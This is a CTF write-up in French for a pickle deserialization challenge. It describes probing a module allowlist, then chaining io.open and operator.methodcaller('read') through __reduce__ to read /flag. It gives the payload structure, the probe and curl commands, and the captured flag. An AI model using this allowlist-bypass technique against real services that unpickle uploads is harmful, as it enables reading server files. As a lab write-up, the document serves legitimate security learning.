# pickle-rce (ModelHub)

- **Catégorie :** web / ml (desrialisation pickle)
- **Points :** 347
- **Instance :** https://5lliqllgwnajmfzm.t.ctf.tg (per-team)
- **Début/Fin :** ven. 06 nov. 23:20 — résolu le soir même, sans indice

## Énoncé
ModelHub charge un pickle uploadé et renvoie repr(objet chargé). Le flag est dans /flag sur l'hôte, jamais renvoyé. But : faire en sorte que l'objet chargé SOIT le contenu de /flag. Bac à sable : refuse os, subprocess, sys, builtins, importlib, ... Leurre : /flag.decoy (à ignorer).

## Faille
Le service fait `repr(pickle.loads(body))`. Un pickle dont le __reduce__ lit /flag
rend le contenu comme objet → repr = flag.

## Obstacle : liste blanche stricte (pas juste la liste annoncée)
Sonde (probe.py, global bidon par module) : BLOQUES = os, subprocess, sys, builtins,
numpy, joblib, pathlib(_local), linecache, shutil, fileinput, glob, mmap, ctypes,
pickle, marshal, sqlite3, socket, logging, gzip/bz2/lzma/tar/zip, csv, configparser...
AUTORISES et presents = io, codecs, _io, operator, functools, json, base64, binascii,
struct, array, collections, itertools, warnings, pydoc, site, email, xml.sax.
(pandas/sklearn/torch/scipy/PIL autorises mais non installes.)

## Ce qui a marché
Chaînage de deux __reduce__ avec des modules autorises :
`operator.methodcaller('read')( io.open('/flag') )`
- OpenFile.__reduce__ -> (io.open, ('/flag',))   # ouvre le fichier côté serveur
- Exploit.__reduce__  -> (operator.methodcaller('read'), (OpenFile(),))  # .read()
Globals vus par le guard : ('operator','methodcaller'), ('_io','open') — tous deux OK.
Teste hors ligne sur /etc/hostname, puis /flag -> status ok, loaded_type str.

## Commandes utiles
```bash
python3 probe.py https://<id>.t.ctf.tg          # cartographie la liste blanche
python3 gen2.py /flag && curl --data-binary @payload_io.pkl https://<id>.t.ctf.tg/validate
```

## Flag
`NCTF{8c69b39519584d249b08a574}`
